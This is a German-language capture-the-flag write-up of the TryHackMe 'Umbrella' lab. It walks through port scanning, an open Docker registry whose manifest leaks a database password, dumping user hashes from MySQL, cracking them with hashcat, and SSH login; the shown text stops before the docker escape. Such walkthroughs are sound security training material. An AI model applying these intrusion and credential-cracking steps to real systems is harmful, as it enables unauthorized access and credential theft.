---
title: Writeup THM Room Umbrella
date: 2024-02-02 11:45:00 +0100
categories: [THM, Room]
tags: [dirsearch, sqlmap, hashid, johashcathn, mysql, docker-escape]
comments: false
---

Intro

Umbrella Corp has been developing a time-tracking application.  

See if you can find a way in.

Please allow the machine 3 - 5 minutes to boot up fully.

```
┌──(bumble㉿bumble)-[/mnt/backup]
└─$ nmap -sT -p-  10.10.201.173        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 09:05 CET
Nmap scan report for 10.10.201.173
Host is up (0.052s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
3306/tcp open  mysql
5000/tcp open  upnp
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 281.43 seconds

```

Schauen wir uns die Ports etwas genauer an

```
┌──(bumble㉿bumble)-[/mnt/backup]
└─$ nmap -sC -sV 10.10.201.173 -p 22,3306,5000,8080
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 09:22 CET
Nmap scan report for 10.10.201.173
Host is up (0.055s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:14:2f:d6:f6:76:8c:58:9a:8e:84:6a:b1:fb:b9:9f (RSA)
|   256 8a:52:f1:d6:ea:6d:18:b2:6f:26:ca:89:87:c9:49:6d (ECDSA)
|_  256 4b:0d:62:2a:79:5c:a0:7b:c4:f4:6c:76:3c:22:7f:f9 (ED25519)
3306/tcp open  mysql   MySQL 5.7.40
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-12-22T10:04:49
|_Not valid after:  2032-12-19T10:04:49
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 5
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, SupportsLoadDataLocal, FoundRows, SupportsCompression, LongColumnFlag, InteractiveClient, Speaks41ProtocolOld, ODBCClient, SupportsTransactions, IgnoreSigpipes, DontAllowDatabaseTableColumn, Support41Auth, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: A9Sx9eKi&OhM4g\x07}=wg)
|_  Auth Plugin Name: mysql_native_password
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
8080/tcp open  http    Node.js (Express middleware)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.47 seconds
```

Schauen wir uns mal die Webseite unter Port 8080 an

![Bild](/assets/Bilder/THM_umbrella/Pasted%20image%2020240202092609.png){: width="700" height="400" }

Versuchen wir mal dirsearch

```
┌──(bumble㉿bumble)-[/mnt/backup]
└─$ dirsearch -u http://10.10.201.173:8080/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /mnt/backup/reports/http_10.10.201.173_8080/__24-02-02_09-27-01.txt

Target: http://10.10.201.173:8080/

[09:27:01] Starting:                                                                                                                                                                                                                        
[09:27:35] 301 -  173B  - /css  ->  /css/                                   
                                                                             
Task Completed   
```

Da wir ein Anmeldefenster habe versuche ich sqlmap

```
┌──(bumble㉿bumble)-[~/Downloads]
└─$ sqlmap -r req.txt --level=5 --risk=3 --batch

```

Leider bekomme ich keine Ergebnisse. Als nächstes schaue ich mir Port 5000 an

Hierzu finde ich hacktricks einen interessanten Eintrag.

https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry

```
┌──(bumble㉿bumble)-[~/Downloads]
└─$ curl -s http://10.10.201.173:5000/v2/_catalog
{"repositories":["umbrella/timetracking"]}
```

Schauen wir noch ob wir Authentifizierung benötigen

```                                                                                                        
┌──(bumble㉿bumble)-[~/Downloads]
└─$ curl -k http://10.10.201.173:5000/v2/_catalog
{"repositories":["umbrella/timetracking"]}
                                             
```

Ok super wird nicht benötigt

```
┌──(bumble㉿bumble)-[~/Downloads]
└─$ curl -s http://10.10.201.173:5000/v2/umbrella/timetracking/tags/list
{"name":"umbrella/timetracking","tags":["latest"]}
                                                                                                                                                                                                                                            
┌──(bumble㉿bumble)-[~/Downloads]
└─$ curl -s http://10.10.201.173:5000/v2/umbrella/timetracking/manifests/latest
{
   "schemaVersion": 1,
   "name": "umbrella/timetracking",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:c9124d8ccff258cf42f1598eae732c3f530bf4cdfbd7c4cd7b235dfae2e0a549"
      },
      {
         "blobSum": "sha256:62c454461c50ff8fb0d1c5d5ad8146203bb4505b30b9c27e6f05461b6d07edcb"
      },
      {
         "blobSum": "sha256:82f3f98b46d4129f725cab6326d0521589d5b75ae0a480256495d216b2cd9216"
      },
      {
         "blobSum": "sha256:e5e56a29478cdf60132aa574648135a89299151414b465942a569f2109eefa65"
      },
      {
         "blobSum": "sha256:7fbf137cf91ff826f2b2fddf3a30ea2e3d2e62d17525b708fd76db392e58df62"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:15b79dac86ef36668f382565f91d1667f7a6fc876a3b58b508b6778d8ed71c0e"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:23e2f216e8246d20ed3271ad109cec07f2a00b17bef8529708d8ae86100c7e03"
      },
      {
         "blobSum": "sha256:f897be510228b2f804fc2cb5d04cddae2e5689cbede553fb2d587c54be0ba762"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3241ece5841b2e29213eb450a1b29385bf9e0063c37978253c98ff517e6e1b3"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:00fde01815c92cc90586fcf531723ab210577a0f1cb1600f08d9f8e12c18f108"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:3f4ca61aafcd4fc07267a105067db35c0f0ac630e1970f3cd0c7bf552780e985"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE_VERSION=19.3.0\",\"YARN_VERSION=1.22.19\",\"DB_HOST=db\",\"DB_USER=root\",\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\",\"DB_DATABASE=timetracking\",\"LOG_FILE=/logs/tt.log\"],\"Cmd\":[\"node\",\"app.js\"],\"Image\":\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\",\"Volumes\":null,\"WorkingDir\":\"/usr/src/app\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":null},\"container\":\"527e55a70a337461e3615c779b0ad035e0860201e4745821c5f3bc4dcd7e6ef9\",\"container_config\":{\"Hostname\":\"527e55a70a33\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE_VERSION=19.3.0\",\"YARN_VERSION=1.22.19\",\"DB_HOST=db\",\"DB_USER=root\",\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\",\"DB_DATABASE=timetracking\",\"LOG_FILE=/logs/tt.log\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) \",\"CMD [\\\"node\\\" \\\"app.js\\\"]\"],\"Image\":\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\",\"Volumes\":null,\"WorkingDir\":\"/usr/src/app\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":{}},\"created\":\"2022-12-22T10:03:08.042002316Z\",\"docker_version\":\"20.10.17\",\"id\":\"7aec279d6e756678a51a8f075db1f0a053546364bcf5455f482870cef3b924b4\",\"os\":\"linux\",\"parent\":\"47c36cf308f072d4b86c63dbd2933d1a49bf7adb87b0e43579d9c7f5e6830ab8\",\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"47c36cf308f072d4b86c63dbd2933d1a49bf7adb87b0e43579d9c7f5e6830ab8\",\"parent\":\"0f4399d82c47d9cecdf2518e3ecb523bbd1936d4a45d4230f1184d81b2b4b40c\",\"created\":\"2022-12-22T10:03:07.855078938Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  EXPOSE 8080\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"0f4399d82c47d9cecdf2518e3ecb523bbd1936d4a45d4230f1184d81b2b4b40c\",\"parent\":\"f0c47bffb88d86d53eb843f6c4d28368c8bbe0aa7261893dcb2f32c5e504e3d1\",\"created\":\"2022-12-22T10:03:07.669136544Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:15724d44e98203ba3eb0cfac139970afa960a98d14ebe5255c867f410039dc6f in . \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"f0c47bffb88d86d53eb843f6c4d28368c8bbe0aa7261893dcb2f32c5e504e3d1\",\"parent\":\"61100ebd58404b5187aa8c0d4788ec64b9f376573ddc3ed1bdc8127dd804934c\",\"created\":\"2022-12-22T10:03:07.378466845Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY dir:f4893f0d1db8ba30964514f355012e263c0715cbc54c0ba03cb8c0e6c448501b in ./views \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"61100ebd58404b5187aa8c0d4788ec64b9f376573ddc3ed1bdc8127dd804934c\",\"parent\":\"9fed1d5f9c3156cf22eb8a501f1482b80ce417b2c114ea4d03149b56889547f7\",\"created\":\"2022-12-22T10:02:17.741096764Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY dir:b1f43f22176dce6e159da3d1f98a7c20f817e9a66b7a2a19a13cd0d3a0bc085c in ./public \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"9fed1d5f9c3156cf22eb8a501f1482b80ce417b2c114ea4d03149b56889547f7\",\"parent\":\"a073207a088b95f3345708ec0365a1f02c1400e96f28e16e1b410371e3b04c3c\",\"created\":\"2022-12-22T10:02:17.258347348Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c npm install\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"a073207a088b95f3345708ec0365a1f02c1400e96f28e16e1b410371e3b04c3c\",\"parent\":\"fd9e6932d7c9f1a9e53620c72101ef85a8c1b9051db767e9171bbedf958be114\",\"created\":\"2022-12-22T10:02:12.292565106Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY multi:8ea3cb977bb32fa75578a182b95f470d3c09488681d420f9d3418b8ab4e232ab in ./ \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"fd9e6932d7c9f1a9e53620c72101ef85a8c1b9051db767e9171bbedf958be114\",\"parent\":\"a736d9865b752b4c30c68719d04b5f5e404bd9302ab81a451a2b6679901ee50d\",\"created\":\"2022-12-22T10:02:12.074407159Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV LOG_FILE=/logs/tt.log\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"a736d9865b752b4c30c68719d04b5f5e404bd9302ab81a451a2b6679901ee50d\",\"parent\":\"15da84a53f8e99c1b070fa72a863ba37ccfd70e0df889ff4a8b03f935e03e98b\",\"created\":\"2022-12-22T10:02:11.849073942Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV DB_DATABASE=timetracking\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"15da84a53f8e99c1b070fa72a863ba37ccfd70e0df889ff4a8b03f935e03e98b\",\"parent\":\"1b554b4528b3ad29a93acfab26b606a4c35c1578d23de83af30dac456324f341\",\"created\":\"2022-12-22T10:02:11.638209337Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"1b554b4528b3ad29a93acfab26b606a4c35c1578d23de83af30dac456324f341\",\"parent\":\"8b227f4d6cab8d95100554ab36684fc95ba5e1b28bf701351a70bf163a0835f6\",\"created\":\"2022-12-22T10:02:11.442849337Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV DB_USER=root\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"8b227f4d6cab8d95100554ab36684fc95ba5e1b28bf701351a70bf163a0835f6\",\"parent\":\"f603fc1e8f3e728e922ce8319cbfbf3e90f0f2e37ece699c71efdaca97d3eac3\",\"created\":\"2022-12-22T10:02:11.231525472Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV DB_HOST=db\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"f603fc1e8f3e728e922ce8319cbfbf3e90f0f2e37ece699c71efdaca97d3eac3\",\"parent\":\"261dd8aecd9946db5cc3287d91024ae9e47c396793e61c954164c8275d42f4e2\",\"created\":\"2022-12-22T10:02:11.03433189Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) WORKDIR /usr/src/app\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"261dd8aecd9946db5cc3287d91024ae9e47c396793e61c954164c8275d42f4e2\",\"parent\":\"b8039dbc7f45c33f3811dbf25406ab4218aeb12feeb2fc4290e629cc2968f88e\",\"created\":\"2022-12-21T11:36:15.041971842Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"node\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"b8039dbc7f45c33f3811dbf25406ab4218aeb12feeb2fc4290e629cc2968f88e\",\"parent\":\"d7d0dccf0d0aa6b5cdea32d2bad40c6115df1ab34ca433042e8d23e081d0a48d\",\"created\":\"2022-12-21T11:36:14.942169961Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENTRYPOINT [\\\"docker-entrypoint.sh\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"d7d0dccf0d0aa6b5cdea32d2bad40c6115df1ab34ca433042e8d23e081d0a48d\",\"parent\":\"4f7072e9d9f756bc5e6e6c281f29d2357e9aa30fbf457b38cecb86d43e02d9e6\",\"created\":\"2022-12-21T11:36:14.843841635Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:4d192565a7220e135cab6c77fbc1c73211b69f3d9fb37e62857b2c6eb9363d51 in /usr/local/bin/ \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"4f7072e9d9f756bc5e6e6c281f29d2357e9aa30fbf457b38cecb86d43e02d9e6\",\"parent\":\"52fb26b66fcd8f4b927bc9e2d534b80b456b68e8ec2792562381cf4ea4e871da\",\"created\":\"2022-12-21T11:36:14.70919854Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -ex   \\u0026\\u0026 savedAptMark=\\\"$(apt-mark showmanual)\\\"   \\u0026\\u0026 apt-get update \\u0026\\u0026 apt-get install -y ca-certificates curl wget gnupg dirmngr --no-install-recommends   \\u0026\\u0026 rm -rf /var/lib/apt/lists/*   \\u0026\\u0026 for key in     6A010C5166006599AA17F08146C2130DFD2497F5   ; do     gpg --batch --keyserver hkps://keys.openpgp.org --recv-keys \\\"$key\\\" ||     gpg --batch --keyserver keyserver.ubuntu.com --recv-keys \\\"$key\\\" ;   done   \\u0026\\u0026 curl -fsSLO --compressed \\\"https://yarnpkg.com/downloads/$YARN_VERSION/yarn-v$YARN_VERSION.tar.gz\\\"   \\u0026\\u0026 curl -fsSLO --compressed \\\"https://yarnpkg.com/downloads/$YARN_VERSION/yarn-v$YARN_VERSION.tar.gz.asc\\\"   \\u0026\\u0026 gpg --batch --verify yarn-v$YARN_VERSION.tar.gz.asc yarn-v$YARN_VERSION.tar.gz   \\u0026\\u0026 mkdir -p /opt   \\u0026\\u0026 tar -xzf yarn-v$YARN_VERSION.tar.gz -C /opt/   \\u0026\\u0026 ln -s /opt/yarn-v$YARN_VERSION/bin/yarn /usr/local/bin/yarn   \\u0026\\u0026 ln -s /opt/yarn-v$YARN_VERSION/bin/yarnpkg /usr/local/bin/yarnpkg   \\u0026\\u0026 rm yarn-v$YARN_VERSION.tar.gz.asc yarn-v$YARN_VERSION.tar.gz   \\u0026\\u0026 apt-mark auto '.*' \\u003e /dev/null   \\u0026\\u0026 { [ -z \\\"$savedAptMark\\\" ] || apt-mark manual $savedAptMark \\u003e /dev/null; }   \\u0026\\u0026 find /usr/local -type f -executable -exec ldd '{}' ';'     | awk '/=\\u003e/ { print $(NF-1) }'     | sort -u     | xargs -r dpkg-query --search     | cut -d: -f1     | sort -u     | xargs -r apt-mark manual   \\u0026\\u0026 apt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false   \\u0026\\u0026 yarn --version\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"52fb26b66fcd8f4b927bc9e2d534b80b456b68e8ec2792562381cf4ea4e871da\",\"parent\":\"4d662e0b4ea7545f5e06efd50d3c2a88d034a08d598e1372db616fea37ccb576\",\"created\":\"2022-12-21T11:36:01.94635104Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV YARN_VERSION=1.22.19\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"4d662e0b4ea7545f5e06efd50d3c2a88d034a08d598e1372db616fea37ccb576\",\"parent\":\"e506a28ea7cc3568976cd14632aa59591493b725c80a7c324b8853def6a5095a\",\"created\":\"2022-12-21T11:36:01.380484014Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c ARCH= \\u0026\\u0026 dpkgArch=\\\"$(dpkg --print-architecture)\\\"     \\u0026\\u0026 case \\\"${dpkgArch##*-}\\\" in       amd64) ARCH='x64';;       ppc64el) ARCH='ppc64le';;       s390x) ARCH='s390x';;       arm64) ARCH='arm64';;       armhf) ARCH='armv7l';;       i386) ARCH='x86';;       *) echo \\\"unsupported architecture\\\"; exit 1 ;;     esac     \\u0026\\u0026 set -ex     \\u0026\\u0026 apt-get update \\u0026\\u0026 apt-get install -y ca-certificates curl wget gnupg dirmngr xz-utils libatomic1 --no-install-recommends     \\u0026\\u0026 rm -rf /var/lib/apt/lists/*     \\u0026\\u0026 for key in       4ED778F539E3634C779C87C6D7062848A1AB005C       141F07595B7B3FFE74309A937405533BE57C7D57       74F12602B6F1C4E913FAA37AD3A89613643B6201       61FC681DFB92A079F1685E77973F295594EC4689       8FCCA13FEF1D0C2E91008E09770F7A9A5AE15600       C4F0DFFF4E8C1A8236409D08E73BC641CC11F4C8       890C08DB8579162FEE0DF9DB8BEAB4DFCF555EF4       C82FA3AE1CBEDC6BE46B9360C43CEC45C17AB93C       108F52B48DB57BB0CC439B2997B01419BD92F80A     ; do       gpg --batch --keyserver hkps://keys.openpgp.org --recv-keys \\\"$key\\\" ||       gpg --batch --keyserver keyserver.ubuntu.com --recv-keys \\\"$key\\\" ;     done     \\u0026\\u0026 curl -fsSLO --compressed \\\"https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-$ARCH.tar.xz\\\"     \\u0026\\u0026 curl -fsSLO --compressed \\\"https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc\\\"     \\u0026\\u0026 gpg --batch --decrypt --output SHASUMS256.txt SHASUMS256.txt.asc     \\u0026\\u0026 grep \\\" node-v$NODE_VERSION-linux-$ARCH.tar.xz\\\\$\\\" SHASUMS256.txt | sha256sum -c -     \\u0026\\u0026 tar -xJf \\\"node-v$NODE_VERSION-linux-$ARCH.tar.xz\\\" -C /usr/local --strip-components=1 --no-same-owner     \\u0026\\u0026 rm \\\"node-v$NODE_VERSION-linux-$ARCH.tar.xz\\\" SHASUMS256.txt.asc SHASUMS256.txt     \\u0026\\u0026 apt-mark auto '.*' \\u003e /dev/null     \\u0026\\u0026 find /usr/local -type f -executable -exec ldd '{}' ';'       | awk '/=\\u003e/ { print $(NF-1) }'       | sort -u       | xargs -r dpkg-query --search       | cut -d: -f1       | sort -u       | xargs -r apt-mark manual     \\u0026\\u0026 apt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false     \\u0026\\u0026 ln -s /usr/local/bin/node /usr/local/bin/nodejs     \\u0026\\u0026 node --version     \\u0026\\u0026 npm --version\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"e506a28ea7cc3568976cd14632aa59591493b725c80a7c324b8853def6a5095a\",\"parent\":\"f9c56f52d7219e5ea722e07ff59d91d84931f65a282fb430b837586afb752adf\",\"created\":\"2022-12-21T11:35:38.095265392Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV NODE_VERSION=19.3.0\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"f9c56f52d7219e5ea722e07ff59d91d84931f65a282fb430b837586afb752adf\",\"parent\":\"c6361740242b1d2d4c6bf3f14b94cc06c3d1dd0b289c320d7406ed23e731b468\",\"created\":\"2022-12-21T11:35:37.993944015Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c groupadd --gid 1000 node   \\u0026\\u0026 useradd --uid 1000 --gid node --shell /bin/bash --create-home node\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"c6361740242b1d2d4c6bf3f14b94cc06c3d1dd0b289c320d7406ed23e731b468\",\"parent\":\"c9a25bc267d407595f101558484d56e017d42d0a8e9a4e41fac3a40435e26068\",\"created\":\"2022-12-21T01:20:33.000852514Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"bash\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"c9a25bc267d407595f101558484d56e017d42d0a8e9a4e41fac3a40435e26068\",\"created\":\"2022-12-21T01:20:32.555983351Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:73e68ae6852c9afbb2989dc9c5b7c6668843f454b1bdcfb48658bfbc6c4af69e in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "VFLQ:XP5S:ALY7:BRV4:XAXX:UPXV:7BXC:QOKS:JQAB:YKER:W6ES:UYVK",
               "kty": "EC",
               "x": "c8sfjjY6Pbe98bvHv4z-b2KuTq1W0s9W4IrdHc3iCts",
               "y": "CwrG4C63pJP1LUBeRfuCK9nweF5dqAUoVChAUj5f538"
            },
            "alg": "ES256"
         },
         "signature": "YZOZJVmLwEgDYdipGFs0CLkHR4aiQJlMeaEc2xMyk3jmZpUBuDdDsXvytXVi5onrcM8ebx01BSBZ4njeKDJihw",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjE2NDY2LCJmb3JtYXRUYWlsIjoiQ24wIiwidGltZSI6IjIwMjQtMDItMDJUMDk6MjA6MDhaIn0"
      }
   ]
} 
```

Ich finde hier Zugangsdaten für den MySql-Server


![Bild](/assets/Bilder/THM_umbrella/Pasted%20image%2020240202130032.png){: width="700" height="400" }

Versuchen wir uns dort hin zu verbinden

```
┌──(bumble㉿bumble)-[~/Downloads]
└─$ mysql -h 10.10.221.197 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show tables;
ERROR 1046 (3D000): No database selected
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| timetracking       |
+--------------------+
5 rows in set (0.062 sec)

MySQL [(none)]> use timetracking;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [timetracking]> show tables;
+------------------------+
| Tables_in_timetracking |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.069 sec)

MySQL [timetracking]> select * from users;
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 |
| chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 |
| jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 |
| barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 |
+----------+----------------------------------+-------+
4 rows in set (0.052 sec)


```

Versuchen wir mal die Passwörter zu cracken

```
┌──(bumble㉿bumble)-[~/Downloads]
└─$ hashcat -a 0 -m 0 hash.txt /mnt/backup/rockyou.txt
Dictionary cache built:
* Filename..: /mnt/backup/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 4 secs

claire-r:2ac9cb7dc02b3c0083eb70898e549b63:xxxx                                                        
```

Versuchen wir uns mal anzumelden

```
┌──(bumble㉿bumble)-[~/Downloads]
└─$ ssh claire-r@10.10.221.197  
The authenticity of host '10.10.221.197 (10.10.221.197)' can't be established.
ED25519 key fingerprint is SHA256:4O8itcDPWBL0nD2ELrDFEMiWY9Pn8UuEdRRP7L8pxr8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.221.197' (ED25519) to the list of known hosts.
claire-r@10.10.221.197's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 02 Feb 2024 02:05:10 PM UTC

  System load:                      0.0
  Usage of /:                       69.6% of 6.06GB
  Memory usage:                     48%
  Swap usage:                       0%
  Processes:                        127
  Users logged in:                  0
  IPv4 address for br-1fddcfdf193d: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.221.197

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

20 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

claire-r@ctf:~$ ls
timeTracker-src  user.txt
claire-r@ctf:~$ cat user.txt 

```

Im User-Verzeichnis finde ich die Quell-Daten für die Seite auf Port 8080.

Interessant ist das der Docker-Container auf den Host zugreift und die Logs dort entsprechend abspeichert

```
claire-r@ctf:~/timeTracker-src$ cat docker-compose.yml 
version: '3.3'
services:
  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: 'timetracking'
      MYSQL_ROOT_PASSWORD: 'Ng1-f3!Pe7-e5?Nf3xe5'
    ports:
      - '3306:3306'     
    volumes:
      - ./db:/docker-entrypoint-initdb.d
  app:
    image: umbrella/timetracking:latest
    restart: always
    ports:
      - '8080:8080'
    volumes:
      - ./logs:/logs

```

